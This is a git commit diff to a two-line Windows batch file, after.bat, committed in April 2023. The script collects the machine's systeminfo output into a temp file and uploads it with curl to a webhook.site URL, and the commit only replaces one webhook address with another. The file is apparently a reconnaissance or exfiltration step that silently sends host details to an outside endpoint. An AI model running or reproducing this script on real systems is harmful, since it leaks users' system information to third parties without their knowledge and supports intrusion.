40a80900cd5204c71cf39252da0c17bbb90faed9
Sajid Alam <117466907+mohammadsajidalam@users.noreply.github.com>
2023-04-05 15:06:48 +0530

    Update after.bat

--- after.bat
+++ after.bat
@@ -1,2 +1,2 @@
 systeminfo > %temp%\info.txt
-curl -T "%temp%/info.txt" "https://webhook.site/07223949-0b3f-42c2-99dc-55f1ce93a6dd"
+curl -T "%temp%/info.txt" "https://webhook.site/9bc6ab72-e787-4f86-aef7-2f2a015b24d1"
